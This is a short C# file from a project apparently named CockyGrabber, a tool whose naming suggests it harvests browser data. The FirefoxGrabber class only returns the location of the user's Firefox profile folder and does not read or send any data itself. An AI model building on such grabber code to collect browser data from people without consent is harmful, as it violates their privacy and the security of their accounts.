using System;

namespace CockyGrabber.Grabbers
{
    public class FirefoxGrabber : GeckoGrabber
    {
        public override string ProfileDirPath
        {
            get
            {
                return $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Mozilla\\Firefox\\Profiles";
            }
        }
    }
}